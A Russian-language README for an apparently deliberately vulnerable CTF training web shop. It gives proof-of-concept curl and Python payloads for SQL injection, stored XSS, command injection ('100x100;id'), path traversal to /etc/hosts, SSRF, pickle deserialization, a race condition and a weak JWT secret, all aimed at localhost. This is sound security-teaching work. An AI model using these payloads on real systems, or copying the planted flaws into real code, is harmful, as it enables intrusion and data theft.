# Инструкция по использованию намеренно уязвимого стенда

Этот файл описывает, как запустить приложение и воспроизвести уязвимости, которые были специально добавлены для CTF-демонстрации.

## 1) Запуск стенда

Из корня репозитория:

```bash
source .venv/bin/activate
cd prod-main
python app.py
```

По умолчанию приложение поднимается на:

- `http://127.0.0.1:5002`

---

## 2) Проверка базовой работоспособности

```bash
curl -s http://127.0.0.1:5002/api/products | python3 -m json.tool
```

---

## 3) Уязвимости и PoC

## SQL Injection

Endpoint: `GET /api/products/search?q=...`

```bash
curl -s "http://127.0.0.1:5002/api/products/search?q=' OR '1'='1" | python3 -m json.tool
```

Ожидаемо: возвращается расширенный список товаров + служебная подсказка про `/api/admin/config`.

## IDOR

Endpoint: `GET /api/orders/<id>`

```bash
curl -s "http://127.0.0.1:5002/api/orders/1" | python3 -m json.tool
```

Ожидаемо: заказ доступен без аутентификации; для `id=1` в ответе есть поле `note` с флагом из окружения.

## Stored XSS

Endpoints: `POST /api/reviews`, `GET /api/reviews`

```bash
curl -s -X POST http://127.0.0.1:5002/api/reviews \
  -H "Content-Type: application/json" \
  -d '{"product_id":"yacht-001","author":"attacker","text":"<script>alert(1)</script>"}' | python3 -m json.tool

curl -s http://127.0.0.1:5002/api/reviews | python3 -m json.tool
```

Ожидаемо: script-тег хранится и отдается без фильтрации.

## Race Condition (двойная трата)

Endpoint: `POST /api/orders`

Сначала добавьте товар в корзину:

```bash
curl -s -X POST http://127.0.0.1:5002/api/cart \
  -H "Content-Type: application/json" \
  -d '{"product_id":"yacht-001","quantity":1}' | python3 -m json.tool
```

Затем отправьте параллельные запросы:

```bash
python3 - <<'PY'
import requests
from threading import Thread

URL = "http://127.0.0.1:5002/api/orders"

def place_order():
    r = requests.post(URL, json={})
    print(r.status_code, r.text[:120])

threads = [Thread(target=place_order) for _ in range(10)]
for t in threads:
    t.start()
for t in threads:
    t.join()
PY
```

Ожидаемо: возможно создание нескольких заказов из одной корзины.

## SSRF

Endpoint: `POST /api/products/import`

```bash
curl -s -X POST http://127.0.0.1:5002/api/products/import \
  -H "Content-Type: application/json" \
  -d '{"image_url":"http://127.0.0.1:5002/debug/data"}' | python3 -m json.tool
```

Ожидаемо: сервер выполняет запрос к внутреннему URL и возвращает фрагмент ответа.

## Command Injection

Endpoint: `POST /api/products/<id>/resize`

```bash
curl -s -X POST http://127.0.0.1:5002/api/products/yacht-001/resize \
  -H "Content-Type: application/json" \
  -d '{"size":"100x100;id"}' | python3 -m json.tool
```

Ожидаемо: в поле `output` видно выполнение команды `id`.

## Path Traversal / LFI

Endpoint: `GET /api/products/<id>/manual?file=...`

```bash
curl -s "http://127.0.0.1:5002/api/products/x/manual?file=/etc/hosts" | python3 -m json.tool
```

Ожидаемо: читается локальный файл ОС.

## JWT Weak Secret

Endpoint: `POST /api/auth/login`

```bash
curl -s -X POST http://127.0.0.1:5002/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":"any"}' | python3 -m json.tool
```

Ожидаемо: выдается JWT, подписанный слабым секретом (`secret123`).

## Insecure Deserialization

Endpoint: `POST /api/cart/import`

```bash
python3 - <<'PY'
import base64
import pickle
import requests

obj = {"items": [{"product_id": "yacht-001", "quantity": 1}]}
payload = base64.b64encode(pickle.dumps(obj)).decode()

r = requests.post(
    "http://127.0.0.1:5002/api/cart/import",
    json={"payload": payload},
    timeout=10
)
print(r.status_code, r.text)
PY
```

Ожидаемо: приложение десериализует `pickle` без валидации.

## Broken Access Control (дополнительно)

Endpoints: `PUT /api/cart/<id>`, `DELETE /api/cart/<id>`

```bash
curl -s -X PUT http://127.0.0.1:5002/api/cart/1 \
  -H "Content-Type: application/json" \
  -d '{"quantity":99}' | python3 -m json.tool
```

Ожидаемо: изменение корзины без авторизации.

## Admin Config (цепочка из writeup)

Endpoint: `GET /api/admin/config`

```bash
curl -s http://127.0.0.1:5002/api/admin/config \
  -H "Cookie: session=admin_session_id" | python3 -m json.tool
```

Ожидаемо: возвращаются `debug`, `version`, `flag`.

---

## 4) Примечания

- Это намеренно уязвимый учебный стенд.
- Не используйте этот код в production.
- Для локальной остановки сервера нажмите `Ctrl+C` в терминале с `python app.py`.
